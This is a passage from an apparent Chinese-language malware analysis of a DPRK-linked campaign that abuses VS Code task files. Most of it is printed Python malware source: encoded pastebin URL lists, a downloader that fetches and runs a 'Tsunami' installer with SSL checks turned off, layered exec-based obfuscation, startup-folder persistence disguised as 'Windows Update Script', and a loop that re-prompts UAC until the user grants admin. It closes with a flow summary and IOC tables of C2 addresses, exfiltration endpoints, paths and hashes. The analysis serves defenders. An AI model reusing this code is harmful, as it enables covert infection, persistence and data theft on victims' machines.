        "6e7542302f433e15090b3832175a2c046f7308126f75685b422537402a2f120e343011100c0160435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f4b4a312c283a113254200b165a24476a73085b6c4b60117b103b0312481e080c203306346470435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c6546782c281c0c3208382c160438025b074862795b4a566f222f05131469260d54371e3f6200047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6f656c312e3722090955280f14212c42686308586f75465945002f411315021f3455233a22026c435276184b6d4c1438381d264933572810391056075a0672114566461c",
        "6f5b607c2e372200093d0a251604384260626664795b6c566e0c3b401214060b0d0b23130c76414551106c574572183c03423d0c3208020e2f313c4b606d71576d5b515b4200334011386d58",
        "6c5b747b2e2826000a332c0b172e025e6f0408156f6546117b103b00123c1e0b0c0a1913386200047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6c6546782f1e220c093d242f2f2e285d6c5908156c5b7814450f3705292e28340f203b590a6641717c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6f5b74312f283e1532222829165b5b5d5b620979795b46586c0c091f134b3c3d345540583d5800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6e65647d2f1d0815342d060b21072459636354476c5b6c156e0f37422a2102310a20231c0d0060435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c5b647b2f1d22150a5624312f312048606d7275795b64566c1c090a2a211a10343211010c6641777c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6f4b42322c271448330e3c1e175b2448686308106e756411450f5418264b69500c0a333d22026c435276184b6d4c1438381d264933572810391056075a0672114566461c",
        "6c4b68792c1d451534083857205a24476372054d774d19136e1c3844112e6113373240103469774f6a7456574572183c03423d0c3208020e2f313c4b606d71576d5b515b4200334011386d58",
        "6f75787c2f42220a31330a142f312400606048476c654a5b6f7b2f40134b692c0d0a33590d5c007b7c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6c7570322c272612313d24242f3e0a595a585c6f795b4a126f1c331f294a062b34302f010d030c637c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6e75427a2c1d260b32575723103e38445b0501476e6578596f2633052a2e341c383027190d767f667c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6f6578782f37450f3222160b2131205a5b0554476c6560136e0f5443124b65290f5533020c014a435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c5b707b2c4236143130341d175b287c614f65146f5b735343252707254b02090a300d01385800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6f4b46312f383a0f3422200b2621205b636d7275795b60586c0c2f1c114b163d0d55195d3f6200047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6e75607c2c27260a09303c0c2f3e20415a5972476e7568586c25371c131434270d54191f0f5c0c737c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6f4b467c2f433e093520280c2c3e5748605e76476f7560116e0f091e12143c310f2011580c0351607c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6c656c7c2f4208110957572a112e16415d607a476c6578136c251503292f02550d55235b0c5a52435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c5b70302e283e15312d2017235b385f60637a476e754a156c7b2b0613171a153a3f3f050f02735d647218106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6c6560302e283e120932382e165b165960070976795b60116e1c2f0a2a2e610d0d0c2f0134767341697456574572183c03423d0c3208020e2f313c4b606d71576d5b515b4200334011386d58",
        "6c4b64782c1d2a150a302414172e0264614f5b136f4b491143253740153c06550c0a231d0c0109435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c65783f2c272a0f0a30341d113e5b47685908156e657815407a2f1c113c1e093755195b0c010d435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6e756c302f1d36000a5728172304385f63726652746719566f0c3040152e28090c0a4c240b6641426a7768574572183c03423d0c3208020e2f313c4b606d71576d5b515b4200334011386d58",
        "6f65467c2c283e0a0932201123041641587372476f6546146f002f042a2e02133a30111c0f695143614818106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6f4b687b2c281c0a34301e0b165b02005b0548476c5b70106f1f331c131706133b20400134036f767c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6e7578322c1e3e0b33082829160438425b720972795b46136e0c2b0a2a21020d0c21371a37666b45534a68574572183c03423d0c3208020e2f313c4b606d71576d5b515b4200334011386d58",
        "6c4b467c2c1e3e0a322d382417042846606040476f5b64596c262f4529211e1f3c3f371f0c015e435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f65787c2e2822130a3d2c1d243124475b076254727719136e0c2009134b061534204c2a34764159517649756d12743e032749131c085b172c0438015a0776566d581917427b2340143e3758",
        "6e7574312e2704133133241d11313c595d737e476f6560586f0f2f00134b16260c200d013d7200047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6f5b4a7b2f1d450f34225b0b24073c4663627e4b707719136e1c2c43294b3c1c0b320d590d037f59646218106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6c756c3f2c42221232543c1d2f3e5b47587372476c5b64596c100d18144a1a133a0a4c1c0f696b5d646218106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6c7546322c27260a09082832112e345d587362476f4b78566f0f371e29211e330d5540100c015e435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f65747b2c4204133430241d1704025860607e476c6574596c1f331c122e3c270c0a4c190d0355627c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6f5b70782f1d261232555b572f3e1a5b606372476f7568126e1f271a12491a0d0d0a333d22026c435276184b6d4c1438381d264933572810391056075a0672114566461c",
        "6c75647a2f37360d32552057113e0665614f71596c65495b420f58061315021f0a2f3b193a7200047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6c5b74792e282203313d0621102e385a5b5e5c476f5b60146f1f3741132e060a3f554c5937640d435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f4b6c312e374912320938132f3e0675614f61596f4b6f5b42255840142f02090a2033593b4800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6f6542322f1e1c0a332d2c56205b284860624865795b78566f1c370a134b060f34313f590d036f40517478574572183c03423d0c3208020e2f313c4b606d71576d5b515b4200334011386d58",
        "6c6546322c1d081134325b0f21312044586354476f6560596c1f3305112f341f370a441f3f5800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6c6568302f422603313d340c243e3c5d5a580911741019566e0c3041143112093b5544010f767f4c625818106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6f4b687a2c283e0e093d24231704575d6d5908156e754a58427a270a112f0a090c0a402b22026c435276184b6d4c1438381d264933572810391056075a0672114566461c",
        "6f5b6c7b2f1e2215322228301121205d5b580968795b605b6c0c37092a2e0a090d0b3705345c7f617c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6f7560322c1d41150a323c0b20043c595b067a62795b74116c322b1f134b162c375519590d7401435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c4b74782f4226033308573f14313c41606058476f6560156f25151a2a2c1a100f30331d0c0168435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f4b46322e381415313d340b200438035b726612776719106c1c0a0a2a2e240d0c30233a0c5f7304694f77636d12743e032749131c085b172c0438015a0776566d581917427b2340143e3758",
        "6f75467b2f433e4c09300a1d2c0428486b0408596c654210427b37442a2c281f0f543f013a6200047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6c5b78792c433a15342d381120043c5d63626254727719596c222842143e69163f30231e0f6770435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f5b643f2e283e12322238172231025a5b057a476c5b78116e1f3300292c280e343f371e376474435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f4b4a302e37261234305b0a2f04387a614f65146f75675b430f271c242e280d0d09233a22026c435276184b6d4c1438381d264933572810391056075a0672114566461c",
        "6c5b647a2e382a09340e280b1704025f5b5e66476c5b4a116c102f02294b69553b5419590f6474435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c654a302c433e0e3222382e2f3124596804085b6c757415441f190312481250343040130f6468435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f656c312e38320f312d201724045b41606054476f5b70126c263341124a3c0d3a20191b0a694904655818106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6f7542302c42360c3208283f165a385a5b065867795b70116e0c2f1b2a2e02133f5540010f664104634818106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6f4b74782f1e3e483522382a2f3e205d63624866795b64126e0c051c2a4b02133c2023130a667f717c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6e65423f2c2832113209200c2f3e3869614f71116f65495b7b7b2f26113e16150d0a332722026c435276184b6d4c1438381d264933572810391056075a0672114566461c",
        "6f5b78302c431c103357571e245a024458627672795b46156e0c33042a2e06310d543b010c7474435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f5b707b2e27181334220254205a025d5b72585b707719566e1c2c432a2112133b0a44010f767f4c625818106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6c4b647c2e27261231321633143e5f59586001476e65465b6c102f1c134b3c0d3b0a440534764143636218106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6c5b707b2c4226170a22382e165b38435b0540476c656c156e102f04123e3c220d2f23050f037f7b7c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6f4b707b2e28320f32551608165b0274614f5b156e656b144525271c233e060e37303b053c7200047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6f4b60312c283e150a222808205a20415d07666c795b42586e1c3345133e69210c0911010d5a68435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c75683f2c42360a0a325f0f202e575a606d7a57736719156e1c2841143e0a150f213b5c0a796b59534d60574572183c03423d0c3208020e2f313c4b606d71576d5b515b4200334011386d58",
        "6f654a322c43221532080a0f213102585a586664795b4a116c1c05041314162234303b1c0f6774435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c6578782f273612320828362f3e0a5a60607a476c4b70106f0f2705142f021c34300103346468435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f65427c2c27220f3320021d11313c595d737e476c7574156e10330012123c090c204c06384800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6c75707c2e27140c3257160b240724475d6d7651756719126f0c0a41134b3c1c0d0a33200c5c0045534c676f6d12743e032749131c085b172c0438015a0776566d581917427b2340143e3758",
        "6f4b427b2c1d2200093020142c313844606001476c7578586e0f330912491e090d0a232722026c435276184b6d4c1438381d264933572810391056075a0672114566461c",
        "6f5b74782c1d4515340e380c2f3e02486f7308126c756059430f3705131406290a2f3f05375c00667c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6f7568322c1d49173430061d2f2e5b595d737e476f5b4a156e002f09292e1e310a204c1f3f5800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6f4b42302e38320d34303c1d165b02026c0408566f65785b4325270013121a15373f23013d4800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6f4b68302f383e15335638242f3e5b04606354476c4b60596f0f581b123e3c2037554019395800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6e6560792c1e220c0a3d24242f3e5f476a7308596f756013422558401214062b0b3033103c4800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6c656c312e370811343d3c17200457425b0472476f754a106c7b2f0711211a553b554c1a37645e435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c6568782f283a15332d240f262e38485b07096f795b60146f222b1c143e6910343227050a5c00717c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6e654a3f2f27261032573c25172e285b5a075c66795b685b6f0c3b092a210a150d0c191c34696b05547415574572183c03423d0c3208020e2f313c4b606d71576d5b515b4200334011386d58",
        "6c4b60792e27140c3430160f14313c4760047e476e7560116f1f1503292f341f0a20331f3f5800047c1310577858143d00273a15342d200f162a5647765b7e564569734e",
        "6e65747a2f1e3e153222283f2f21244760076672795b68146e0c330329210655375733060a767f7c7c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6c5b747d2f433e150a575b17262e384163070957704d19586e1c240814311e09382f3b01346778435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6f5b4a792c433e0a32225734170402035b727665795b64126c0c3b0a12143c133f55331c0c5a7c435472185543136c3d031d1c100a3d3c1d2c312f47754f405b4269731140095c4d",
        "6c4b687c2f281c0a33225f2d165b3c445d606a476c6546116e002f04292e02270d550d0137036f707c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6f6560782e38220e32573c252f2e38415b726672795b78146e0c051c134a060d3f543f0534766b45614818106d13103e3809450c3132240b112120595a7608576e4f6f564500331f",
        "6f5b46312e283e0b320828322f5b5b415b585c64795b645b6f322b1b2a211a0f37313b050c6655787c127457437618222d1d450909083857165b2846754c081742126311450f064d",
        "6e7568782c1e3e4933085708205a3c415a58666f795b46126f223306113e1e500d563704345c0059625818106d13103e3809450c3132240b112120595a7608576e4f6f564500331f"
    ]

    # URL Extraction stuff

    # Extensive documentation on this process has been included on my YouTube channel: https://www.youtube.com/watch?v=QB7ACr7pUuE

    def download_pastebin_document(url: str) -> str:
        req = urllib.request.Request(
            url,
            headers = {"User-Agent": "Mozilla/5.0"}
        )

        # SSL off

        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        with urllib.request.urlopen(req, context=context) as res:
            return res.read().decode("utf-8")

    def extract_url(document: str, link_text: str) -> list:
        pattern = r'<a\s+(?:[^>]*?\s+)?href="([^"]+)"[^>]*>' + re.escape(link_text) + r'</a>'
        match = re.search(pattern, document)

        if match:
            href = match.group(1)
            return "https://pastebin.com/raw" + href
        else:
            return None

    # Signature verification stuff

    def extract_and_verify_payload_data(payload_data: str) -> bool:
        # Hard coded public key

        trusted_public_key = serialization.load_pem_public_key(binascii.unhexlify(b"0a2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541765267784e3576576e79312f6441633773364b4d0a5a55527971517469314f453131506b615850593332453339544b61753676442b516e74574b4e5446493533576d6b76593659624c476630366f695a39397559640a546b654c2f67744b666e6150504f74316d41444c3952336e46777957414277375134314e67596c753758484d69545575682f545250764f69584c35794b782b340a506e58734e2b73453933706b32714e70422b636e4a312f62347265383978754e70443948516a6a73646133504e4f44313373374f4c3766712b37347459346f630a4d5136424e464f71394a343678642f346a6179386e2f713333763350677777734c36545152356772556466626c585a38575a7a7858564b45714d74714a746d520a4d387a6a486f6f647330506f6f704f5336497a6f59442b616e63687a354a434b484272724d586438672b4132684d712b57356c456b497974626531645058736e0a43514944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a"))

        # Decode message and extract its parts

        payload = json.loads(
            binascii.unhexlify(payload_data.encode("utf-8")).decode("utf-8")
        )

        message = payload["message"]
        signature = base64.b64decode(payload["signature"].encode("utf-8"))

        # Verify the message integrity and signature matches our trusted one

        try:
            trusted_public_key.verify(
                signature,
                message.encode("utf-8"),
                padding.PSS(
                    mgf=padding.MGF1(hashes.SHA256()),
                    salt_length=padding.PSS.MAX_LENGTH
                ),
                hashes.SHA256()
            )

            output("Message and signature integrity check succeeded, message is authentic")

            return message
        except:
            output("Message and signature integrity check failed, message contents will be rejected")

            return None

    # Try each URL. URLs may have non-404 errors, so rescan the list of URLs

    for url in URLS:
        try:
            # Decode the url pair

            pair = decode(url)

            # Extract the profile URL and filename

            profile_url = pair.split("_")[0]
            filename = pair.split("_")[1]

            # Download the document HTML and extract the URL

            document = download_pastebin_document(profile_url)
            url = extract_url(document, filename)

            # :(
            if url == None:
                continue

            # SSL off

            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            # Download the contents of the file

            req = urllib.request.Request(
                url,
                headers = {"User-Agent": "Mozilla/5.0"}
            )

            with urllib.request.urlopen(req, context=context) as res:
                # Check the payload data then XOR decode the message

                message = extract_and_verify_payload_data(res.read().decode("utf-8").strip())

                if message:
                    return decode(message)
        except Exception as e:
            # Failure, try the next URL in 5 seconds

            output(f"Failure, waiting... ({e})")

            time.sleep(1)

    # Not found

    return ""

##### Tsunami Injector #####

def download_installer() -> None:
    # Ensure the Tsunami Installer folder exists

    if not os.path.exists(TSUNAMI_INSTALLER_FOLDER):
        os.makedirs(TSUNAMI_INSTALLER_FOLDER, exist_ok = True)

    # Create the temporary file to download to

    download_tempfile = tempfile.NamedTemporaryFile(delete = False).name

    # Get the installer URL

    installer_url = download_installer_url()

    # Download the file from the URL to the temporary download file (SSL off)

    ssl._create_default_https_context = ssl._create_unverified_context

    urllib.request.urlretrieve(installer_url, download_tempfile)

    # Decode the file and save it to the installer path

    with open(download_tempfile, "rb") as f:
        data = f.read()

    decoded = gzip.decompress(data[::-1])

    with open(TSUNAMI_INSTALLER_PATH, "wb") as f:
        f.write(decoded)

    # Delete the temp file

    try:
        os.remove(download_tempfile)
    except:
        pass

def extract_payload() -> None:
    # Extract the payload to its temp file

    with open(TSUNAMI_PAYLOAD_PATH, "w") as f:
        f.write(obfuscate_script(TSUNAMI_PAYLOAD_SCRIPT, 50))

def execute_payload_with_uac() -> bool:
    # Get the filepath of the pythonw.exe

    py_exe = sys.executable
    py_exe = py_exe.replace("python.exe", "pythonw.exe")

    # Execute the payload with UAC

    result = ctypes.windll.shell32.ShellExecuteW(
        None,
        "runas",
        py_exe,
        f'"{TSUNAMI_PAYLOAD_PATH}"',
        None,
        1
    )

    # Return true if it worked, false if it failed

    if result <= 32:
        return False
    else:
        return True
        #hel p me

##### Application Entry #####

if __name__ == "__main__":
    # Check if the Tsunami Installer task is scheduled

    if is_task_scheduled(TSUNAMI_INSTALLER_NAME):
        # Task is scheduled, check if the Tsunami Installer payload is installed

        if not os.path.exists(TSUNAMI_INSTALLER_PATH):
            # Task is scheduled but the Tsunami Installer is not installed yet, download and extract it

            output("[+] Task is scheduled but the Tsunami Installer was not found. Downloading and extracting...")

            # Download the Tsunami Installer

            download_installer()
        else:
            # Task is scheduled and the Tsunami Installer is installed, there is nothing to do but exit

            output("[+] Task is scheduled and the Tsunami Installer is installed. Exiting...")
    else:
        # Task is not scheduled

        output("[+] Task is not yet scheduled, attempting to execute the Tsunami Payload")

        # Extract the Tsunami Payload

        extract_payload()

        # Execute the Tsunami Payload

        while True:
            # Sleep for 10 to 20 minutes

            time.sleep(random.uniform(600, 1200))

            # Execute the Tsunami Payload

            if execute_payload_with_uac():
                # User gave administrator to the Tsunami Payload

                output("[+] User accepted UAC prompt for administrator. The Tsunami Payload executed successfully")

                # Nothing more to do, exit the execution loop

                break
            else:
                # User rejected administrator for the Tsunami Payload, try again

                output("[-] User rejected UAC prompt for administrator. Retrying shortly...")

    # Keep the window open in debug mode for analysis

    if DEBUG_MODE:
        input()
                              """

    ##### Obfuscator #####

    zlb = lambda in_ : zlib.compress(in_)
    b64 = lambda in_ : base64.b64encode(in_)

    def obfuscate_script(data: str, loop_count: int) -> str:
        # Change the value of the random variable to ensure different obfuscation strings each time

        data = data.replace("RandVar = '?'", f"RandVar = '{random.randint(100000, 10000000)}'")

        # Setup obfuscation

        xx = "b64(zlb(data.encode('utf8')))[::-1]"
        prefix = "_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));"

        # Perform obfuscation

        for i in range(loop_count):
            try:
                data = "exec((_)(%s))" % repr(eval(xx))
            except TypeError as s:
                sys.exit(" TypeError : " + str(s))

        # Build the complete output

        output = ""

        output += "\n"
        output += prefix
        output += data
        output += "\n"

        # Return the output

        return output

    ##### Utils #####

    def output(text: str) -> None:
        if DEBUG_MODE:
            print(text)

    def download_file(url: str, file_path: str):
        try:
            powershell_script = f"""
            $url = "{url}"
            $filePath = "{file_path}"
            Invoke-WebRequest -Uri $url -OutFile $filePath
                                """

            subprocess.run(
                ["powershell", "-Command", powershell_script],
                check = True,
                creationflags = subprocess.CREATE_NO_WINDOW,
            )

            output(f"File downloaded successfully to: {file_path}")
        except subprocess.CalledProcessError as e:
            output(f"Error downloading file with PowerShell: {e}")

    ##### Tsunami Infecter #####

    def is_python_installed() -> bool:
        try:
            # Check if the platform is Windows
            if platform.system() == "Windows":
                # Check HKEY_LOCAL_MACHINE
                key = r"SOFTWARE\Python\PythonCore"
                try:
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key) as reg_key:
                        # Get the subkeys (versions) under PythonCore
                        subkeys_count = winreg.QueryInfoKey(reg_key)[0]
                        if subkeys_count > 0:
                            # Get the latest Python version
                            latest_version = max([float(winreg.EnumKey(reg_key, i)) for i in range(subkeys_count)])
                            output(f"Python {latest_version} is installed.")
                            return True
                except FileNotFoundError:
                    pass  # Ignore if the key is not found in HKEY_LOCAL_MACHINE

                # Check HKEY_CURRENT_USER
                key = r"SOFTWARE\Python\PythonCore"
                try:
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key) as reg_key:
                        # Get the subkeys (versions) under PythonCore
                        subkeys_count = winreg.QueryInfoKey(reg_key)[0]
                        if subkeys_count > 0:
                            # Get the latest Python version
                            latest_version = max([float(winreg.EnumKey(reg_key, i)) for i in range(subkeys_count)])
                            output(f"Python {latest_version} is installed.")
                            return True
                except FileNotFoundError:
                    pass  # Ignore if the key is not found in HKEY_CURRENT_USER

                output("Python is not installed.")
                return False
            else:
                output("This function is designed for Windows systems.")
                return False
        except Exception as e:
            output(f"Error: {e}")
            return False

    def execute_python_with_uac(py_installer_path: str) -> bool:
        result = ctypes.windll.shell32.ShellExecuteW(
            None,
            "runas",
            py_installer_path,
            "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0",
            None,
            0
        )

        # Return true if it worked, false if it failed

        if result <= 32:
            return False
        else:
            return True

    def install_python() -> None:
        # Create a temporary download path for the Python installer

        py_installer_path = tempfile.NamedTemporaryFile(delete = False).name + ".exe"

        # Download the Python installer to the path

        download_file(PYTHON_INSTALLER_URL, py_installer_path)

        # Execute the Python installer to run silently with a UAC prompt

        while True:
            # Sleep for 10 to 30 seconds

            time.sleep(random.uniform(10, 30))

            # Attempt to execute the Python Installer as administrator with UAC

            if execute_python_with_uac(py_installer_path):
                # Successfully executed

                output("[+] The Python installer ran successfully, Python is being installed to the system")

                # Python installer run successfully, nothing left to do but exit

                break
            else:
                # User rejected UAC

                output("[-] User rejected UAC for Python, retrying...")

    ##### Application Entry #####

    if __name__ == "__main__":
        # Check if Python is not installed to the system

        if not is_python_installed():
            # Python is not installed

            output("[+] Python is not installed, downloading the installer...")

            # Install Python

            install_python()
        else:
            # Python is already installed

            output("[+] Python is already installed")

        # Package installations

        try:
            import cryptography
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])

        # Write the Tsunami Injector to the startup folder if it does not already exist

        with open(TSUNAMI_INJECTOR_PATH, "w") as f:
            f.write(obfuscate_script(TSUNAMI_INJECTOR_SCRIPT, loop_count = 50))

        output("[+] Wrote the Tsunami Injector to the startup folder")

        # Keep the window open in debug mode for analysis

        if DEBUG_MODE:
            input()
except:
    # :(
    pass

```

到這邊 Sample 2 大致的執行流程就結束了，最後統整一下執行的過程

- 初始讓使用者用vscode 相關 editer 透過 task.json 請求惡意檔案
- 再通過多層 javascript + python dropper 下載惡意程式
- 這類的 Sample 會在混淆過後的 Javascrpt 中執行以下行為
  - 竊取使用者瀏覽器、錢包、機密檔案資料
  - 透過 `https://api.npoint[.]io` 獲得配置 python 設定檔
  - 下載 python 惡意程式
- 在惡意 python 程式會有以下行為
  - 利用 zlibcompress + base64decode 混淆程式碼
  - 透過 `https://pastebin[.]com/`傳輸惡意程式配置文件
  - 經常利用 XOR + base64decode + 反轉解密
  - 建立 C2
    - C2 : `146.70.253[.]107:122`
  - 下載 TSUNAMI 惡意程式
    - Sha256 : `ab7608bc7af2c4cdf682d3bf065dd3043d7351ceadc8ff1d5231a21a3f2c6527`

相關的分析報告

- https://opensourcemalware.com/blog/contagious-interview-vscode
- https://radar.securityalliance.org/vs-code-tasks-abuse-by-contagious-interview-dprk/

根據分析報告，這次的攻擊取代了 BeaverTail 需要要求開發者手動觸發 npm ，而是轉成利用開發者通常都會信任vscode 資料夾的方式觸法

## IOC

### Sample 1

#### Network Indicators

| Type        | Value                                           | Description                                    |
| :---------- | :---------------------------------------------- | :--------------------------------------------- |
| Domain      | `www.vscodeconfig[.]com`                        | Stage 1 Dropper                                |
| Domain      | `vscodesetting.vercel[.]app`                    | Stage 2 Dropper (Download script & package)    |
| Domain      | `mylocation-info.vercel[.]app`                  | Payload Delivery (Encrypted JS)                |
| IP          | `144.172.107[.]191`                             | C2 Server (All traffic)                        |
| C2 Endpoint | `http://144.172.107[.]191:8085/upload`          | Data Exfiltration (Browser Data)               |
| C2 Endpoint | `http://144.172.107[.]191:8085/api/upload-file` | Data Exfiltration (Large Files/Command Result) |
| C2 Endpoint | `http://144.172.107[.]191:8086/upload`          | Data Exfiltration (Sensitive Files)            |
| C2 Endpoint | `http://144.172.107[.]191:8087/api/notify`      | Host Online Notification                       |
| C2 Endpoint | `http://144.172.107[.]191:8087/api/log`         | Clipboard Logs / Startup Logs                  |
| C2 Endpoint | `ws://144.172.107[.]191:8087`                   | Command & Control (WebSocket)                  |

#### Host-Based Indicators

| Type      | Value                                      | Description                  |
| :-------- | :----------------------------------------- | :--------------------------- |
| File Path | `$HOME/.vscode/vscode-bootstrap.sh`        | Dropper Script               |
| File Path | `$HOME/.vscode/env-setup.js`               | Payload Launcher             |
| File Path | `$HOME/.vscode/package.json`               | Malicious Package Config     |
| File Path | `%TEMP%/pid.<timestamp>.1.lock`            | Lock File (Browser Stealer)  |
| File Path | `%TEMP%/pid.<timestamp>.2.lock`            | Lock File (File Scanner)     |
| File Path | `%TEMP%/pid.<timestamp>.3.lock`            | Lock File (C2 Client)        |
| File Path | `%TEMP%/.upload_<timestamp>_*/s.txt`       | Stolen Passwords (Temporary) |
| File Path | `%TEMP%/.upload_<timestamp>_*/sysinfo.txt` | System Info (Temporary)      |

### Sample 2

#### Network Indicators

| Type | Value                                         | Description                                  |
| :--- | :-------------------------------------------- | :------------------------------------------- |
| IP   | `146.70.253[.]107`                            | Primary C2 (HTTP :1224, Socket :2241)        |
| IP   | `23.227.203[.]18`                             | Backup C2 (HTTP :1224)                       |
| IP   | `23.254.164[.]156`                            | Payload Delivery (Tsunami Installer)         |
| URL  | `http://146.70.253[.]107:1224/keys`           | System Info Beacon & Key Exchange            |
| URL  | `http://146.70.253[.]107:1224/uploads`        | Data Exfiltration Endpoint                   |
| URL  | `http://146.70.253[.]107:1224/client/15/812`  | Stage 2 Python Payload Download              |
| URL  | `https://pastebin[.]com/raw/u/NotingRobe2871` | Encrypted Payload Config (Targeting Windows) |

#### Host-Based Indicators

| Type            | Value                                                                               | Description                            |
| :-------------- | :---------------------------------------------------------------------------------- | :------------------------------------- |
| File Path       | `~/.n2/way`                                                                         | C2 Client / Remote Shell (Python)      |
| File Path       | `~/.n2/pow`                                                                         | Windows Dropper / Persistence (Python) |
| File Path       | `~/.n2/bow`                                                                         | Same as pow                            |
| File Path       | `~/.n2/adc`                                                                         | AnyDesk Bundle                         |
| File Path       | `~/.n2/flist`                                                                       | Upload Queue Log                       |
| File Path       | `~/.nlq`                                                                            | Stage 2 Encrypted Payload              |
| File Path (Win) | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Script.pyw` | Persistence Script (Tsunami Injector)  |
| File Path (Win) | `%APPDATA%\Microsoft\Windows\Applications\Runtime Broker.exe`                       | Tsunami Installer                      |
| File Path (Win) | `%LOCALAPPDATA%\Microsoft\Windows\Applications\Runtime Broker.exe`                  | Tsunami Client / Payload               |
| File Path (Win) | `%LOCALAPPDATA%\Microsoft\Windows\Applications\msedge.exe`                          | XMRig Miner                            |
| File Path (Win) | `%TEMP%/<16_Random_Chars>`                                                          | Temporary Tsunami Payload              |

#### Cryptographic Indicators

| Type    | Value                                | Description                                     |
| :------ | :----------------------------------- | :---------------------------------------------- |
| XOR Key | `!!!HappyPenguin1950!!!`             | Used for configuration and payload decryption   |
| RSA Key | `MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8...` | Hardcoded Public Key for Signature Verification |

#### Malicious Hashes

| Type   | Value                                                              | Description                            |
| :----- | :----------------------------------------------------------------- | :------------------------------------- |
| SHA256 | `ab7608bc7af2c4cdf682d3bf065dd3043d7351ceadc8ff1d5231a21a3f2c6527` | Tsunami Installer (Runtime Broker.exe) |

## Conclusion

> 別相信任何來不不明的專案 by yunshiuan
